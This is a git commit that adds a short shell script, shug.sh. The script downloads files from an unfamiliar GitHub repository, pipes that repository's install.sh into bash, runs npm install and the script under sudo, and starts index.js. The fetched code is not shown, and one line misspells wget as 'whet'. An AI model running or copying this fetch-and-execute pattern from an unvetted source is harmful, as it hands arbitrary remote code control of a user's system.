6a143c7b1ee9082503198b51e2158c6b7c40325e
traapoks <165988185+traapoks@users.noreply.github.com>
2024-04-04 20:20:34 +0700

    Create shug.sh

---
+++ shug.sh
@@ -0,0 +1,12 @@
+wget https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/config.json
+wget https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/ecosystem.config.js
+wget https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/index.js
+wget https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/install.sh
+whet https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/package.json
+sudo apt update
+sudo apt install curl ca-certificates -y
+curl https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/install.sh | bash
+source ~/.bashrc
+npm install
+sh install.sh
+node index.js
